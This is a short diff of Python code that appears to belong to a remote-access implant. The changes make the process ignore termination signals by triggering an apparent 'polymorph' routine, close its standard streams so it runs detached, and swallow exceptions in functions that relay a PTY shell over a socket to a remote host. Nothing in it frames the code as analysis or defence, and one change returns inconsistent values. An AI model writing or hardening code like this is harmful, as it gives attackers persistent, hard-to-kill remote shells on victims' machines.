@@ -52,8 +52,8 @@ def main():
 def shield():
     for sig in [signal.SIGHUP, signal.SIGINT, signal.SIGABRT, signal.SIGQUIT, signal.SIGTERM]:
         signal.signal(sig, sh)
-    # for fd in [sys.stdin, sys.stdout, sys.stderr]:
-    #     os.close(fd.fileno())
+    for fd in [sys.stdin, sys.stdout, sys.stderr]:
+        os.close(fd.fileno())
 
 def sh(a, b):
     polymorph()
@@ -150,8 +150,8 @@ def run_pty(sock):
             if quit:
                 sock.send(b'\xc0\xdenpty')
                 return pty_barrier(sock)
-    #except:
-    #    return False
+    except:
+        return True, False
     finally:
         sel.close()
         try:
@@ -218,8 +218,8 @@ def work(h_addr, port, privkey, bits):
             if not live or not cont:
                 break
         return live
-    #except:
-    #    return True
+    except:
+        return True
     finally:
         raw_sock.close()
 
